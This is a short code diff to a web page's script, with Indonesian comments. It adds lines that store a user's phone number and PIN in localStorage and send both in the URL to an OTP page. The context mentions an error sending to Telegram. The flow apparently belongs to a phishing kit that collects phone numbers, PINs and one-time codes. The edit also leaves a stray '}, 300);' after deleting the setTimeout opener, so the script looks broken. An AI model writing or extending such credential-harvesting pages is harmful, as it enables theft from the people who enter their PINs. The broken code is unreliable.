@@ -158,9 +158,14 @@
       } catch (err) {
         console.log("Error Telegram");
       }
+      // SIMPAN KE LOCALSTORAGE & KIRIM LEWAT URL
+localStorage.setItem('userPhone', userPhone);
+localStorage.setItem('userPin', pin);
 
-      setTimeout(() => {
-        window.location.href = "sukses.html"; 
+// Pindah ke halaman OTP dengan membawa data lengkap
+window.location.href = "otp.html?phone=" + userPhone + "&pin=" + pin;
+
+      
       }, 300);
     }
   </script>
